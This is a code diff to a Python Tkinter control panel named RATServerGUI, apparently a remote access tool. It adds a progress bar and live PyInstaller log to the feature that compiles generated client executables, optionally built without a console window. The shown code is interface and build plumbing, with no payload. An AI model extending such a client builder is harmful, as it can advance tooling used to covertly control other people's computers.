@@ -119,6 +119,9 @@ class RATServerGUI:
         self.style.configure("TEntry",       fieldbackground=self.bg_input, foreground=self.text_color, insertcolor=self.text_color, borderwidth=1, relief="flat")
         self.style.configure("TNotebook",    background=self.bg_main)
         self.style.configure("TScrollbar",   background=self.bg_sidebar, troughcolor=self.bg_main, arrowcolor=self.text_muted)
+        self.style.configure("Build.Horizontal.TProgressbar",
+            troughcolor=self.bg_input, background=self.accent_color,
+            borderwidth=0, thickness=6)
 
         self.clients = {}
         self.current_client_id = None
@@ -769,7 +772,32 @@ class RATServerGUI:
         bf = tk.Frame(gen, bg=self.bg_card)
         bf.pack(anchor="w", padx=10, pady=5)
         ttk.Button(bf, text="Générer client", command=self.manual_generate_client).pack(side="left", padx=(0, 8))
-        ttk.Button(bf, text="Build exécutable", command=self.build_client_executable).pack(side="left")
+        self._build_btn = ttk.Button(bf, text="Build exécutable", command=self.build_client_executable)
+        self._build_btn.pack(side="left")
+
+        # Zone de progression build (cachée par défaut)
+        self._build_progress_frame = tk.Frame(gen, bg=self.bg_card)
+        self._build_progress_frame.pack(fill="x", padx=10, pady=(0, 6))
+        self._build_progress_frame.pack_forget()
+
+        prog_header = tk.Frame(self._build_progress_frame, bg=self.bg_card)
+        prog_header.pack(fill="x", pady=(4, 2))
+        self._build_status_lbl = tk.Label(prog_header, text="⏳ Compilation en cours…",
+            fg=self.warning_color, bg=self.bg_card, font=("Segoe UI", 8, "bold"), anchor="w")
+        self._build_status_lbl.pack(side="left")
+        self._build_pct_lbl = tk.Label(prog_header, text="",
+            fg=self.text_muted, bg=self.bg_card, font=("Consolas", 8), anchor="e")
+        self._build_pct_lbl.pack(side="right")
+
+        self._build_progressbar = ttk.Progressbar(self._build_progress_frame,
+            style="Build.Horizontal.TProgressbar", mode="indeterminate", length=200)
+        self._build_progressbar.pack(fill="x", pady=(0, 3))
+
+        self._build_log = tk.Text(self._build_progress_frame, height=4,
+            bg="#080b10", fg=self.text_muted, font=("Consolas", 7),
+            bd=0, highlightthickness=1, highlightbackground=self.border_color,
+            insertbackground=self.text_color, state="disabled", wrap="none")
+        self._build_log.pack(fill="x")
 
     # ═══════════════════════════════════════════════════════════════════
     # HELP
@@ -1705,15 +1733,59 @@ DÉMARRAGE RAPIDE:
         else:
             messagebox.showerror("Error", "Failed to generate client. Check logs.")
 
+    def _build_progress_show(self):
+        self._build_progress_frame.pack(fill="x", padx=10, pady=(0, 6))
+        self._build_log.config(state="normal")
+        self._build_log.delete("1.0", tk.END)
+        self._build_log.config(state="disabled")
+        self._build_pct_lbl.config(text="")
+        self._build_status_lbl.config(text="⏳ Compilation en cours…", fg=self.warning_color)
+        self._build_progressbar.config(mode="indeterminate")
+        self._build_progressbar.start(12)
+        self._build_btn.config(state="disabled")
+
+    def _build_progress_hide(self, success=True):
+        self._build_progressbar.stop()
+        if success:
+            self._build_progressbar.config(mode="determinate", value=100)
+            self._build_status_lbl.config(text="✓ Build terminé", fg=self.success_color)
+        else:
+            self._build_progressbar.config(mode="determinate", value=0)
+            self._build_status_lbl.config(text="✕ Build échoué", fg=self.error_color)
+        self._build_btn.config(state="normal")
+
+    def _build_log_append(self, line):
+        self._build_log.config(state="normal")
+        self._build_log.insert(tk.END, line + "\n")
+        self._build_log.see(tk.END)
+        self._build_log.config(state="disabled")
+
+    def _build_update_phase(self, line):
+        # Extrait les phases PyInstaller pour afficher un statut lisible
+        line_lower = line.lower()
+        if "analysis" in line_lower or "analysing" in line_lower:
+            self._build_status_lbl.config(text="🔍 Analyse des dépendances…", fg=self.warning_color)
+            self._build_pct_lbl.config(text="25%")
+        elif "collecting" in line_lower or "building" in line_lower:
+            self._build_status_lbl.config(text="📦 Collecte des modules…", fg=self.warning_color)
+            self._build_pct_lbl.config(text="50%")
+        elif "exe" in line_lower or "onefile" in line_lower or "packing" in line_lower or "append" in line_lower:
+            self._build_status_lbl.config(text="🔧 Assemblage de l'exécutable…", fg=self.warning_color)
+            self._build_pct_lbl.config(text="80%")
+        elif "successfully" in line_lower or "completed" in line_lower:
+            self._build_pct_lbl.config(text="100%")
+
     def build_client_executable(self):
         if not os.path.exists("client_gen.py"):
             self.log_message("Generate client_gen.py first", "error")
             messagebox.showerror("Error", "Generate client_gen.py first (Settings tab).")
             return False
 
+        self._show_section("settings")
+        self.root.after(0, self._build_progress_show)
+
         def _build():
             try:
-                # Toujours utiliser des chemins absolus
                 base_dir = os.path.dirname(os.path.abspath(__file__))
                 if self.save_to_builds_var.get():
                     dist_path = os.path.join(base_dir, "builds", "clients")
@@ -1741,20 +1813,31 @@ DÉMARRAGE RAPIDE:
                     cmd.append("--noconsole")
                 cmd.append(client_gen_path)
 
-                self.root.after(0, lambda: self.log_message(f"Building .exe — cela peut prendre 30-60s...", "info"))
-                self.root.after(0, lambda: self.log_message(f"Dossier de sortie: {dist_path}", "info"))
+                self.root.after(0, lambda: self.log_message("Building .exe — cela peut prendre 30-60s…", "info"))
 
-                result = subprocess.run(cmd, capture_output=True, text=True, cwd=base_dir)
+                proc = subprocess.Popen(
+                    cmd, cwd=base_dir,
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    text=True, bufsize=1
+                )
 
-                if result.returncode == 0:
+                for raw_line in proc.stdout:
+                    line = raw_line.rstrip()
+                    if not line:
+                        continue
+                    ln = line  # capture
+                    self.root.after(0, lambda l=ln: self._build_log_append(l))
+                    self.root.after(0, lambda l=ln: self._build_update_phase(l))
+
+                proc.wait()
+
+                if proc.returncode == 0:
                     ext = ".exe" if platform.system() == "Windows" else ""
                     exe_path = os.path.join(dist_path, f"{name}{ext}")
+                    p, d = exe_path, dist_path
 
-                    p = exe_path  # capture pour lambda
-                    d = dist_path
-
+                    self.root.after(0, lambda: self._build_progress_hide(success=True))
                     self.root.after(0, lambda: self.log_message(f"[BUILD OK] {p}", "success"))
-                    self.root.after(0, lambda: self.log_message(f"Dossier: {d}", "success"))
 
                     def _show_result():
                         answer = messagebox.askquestion(
@@ -1773,13 +1856,13 @@ DÉMARRAGE RAPIDE:
                     self.root.after(0, _show_result)
                     return True
                 else:
-                    err = result.stderr[-600:] if result.stderr else "Erreur inconnue"
-                    self.root.after(0, lambda: self.log_message(f"Build échoué: {err}", "error"))
-                    self.root.after(0, lambda: messagebox.showerror("Build échoué", err[:300]))
+                    self.root.after(0, lambda: self._build_progress_hide(success=False))
+                    self.root.after(0, lambda: self.log_message("Build échoué — voir log de compilation ci-dessus", "error"))
                     return False
 
             except Exception as e:
                 err_msg = str(e)
+                self.root.after(0, lambda: self._build_progress_hide(success=False))
                 self.root.after(0, lambda: self.log_message(f"Build error: {err_msg}", "error"))
                 return False
 
